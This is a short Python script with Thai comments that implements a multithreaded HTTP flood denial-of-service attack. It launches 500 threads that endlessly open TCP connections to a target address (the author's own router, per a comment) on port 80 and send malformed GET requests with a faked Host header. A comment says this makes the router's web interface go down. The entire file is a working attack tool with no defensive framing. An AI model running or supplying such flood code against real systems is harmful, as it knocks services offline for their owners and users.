import socket
import threading


target = '192.168.1.1'   #default gateway ที่ได้จาก ipconfig กรณีนั้ผมโจมตี router ตัวเอง 
#ip

#port 22  SSH service ddos เว็บยังใช้ได้
#port 80  HTTP หน้าเว็บ web interface จะล่ม
port = 80
fake_ip = '181.21.20.32'
already_conenct = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        #resource socket_create ( int $domain , int $type , int $protocol )
        #AF_INET  คือ IPv4 , AF_INET6 คือ IPV6    

        s.connect((target , port)) #เชื่อมต่อ
        s.sendto(("GET / " + target + "HTTP/1.1\r\n").encode('ascii'),(target,port)) 
        s.sendto(("HOST:" + fake_ip + "\r\n\r\n").encode('ascii'),(target,port))
        s.close()

        global already_conenct
        already_conenct += 1
        if already_conenct % 500 == 0:
            print(already_conenct)
            

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()

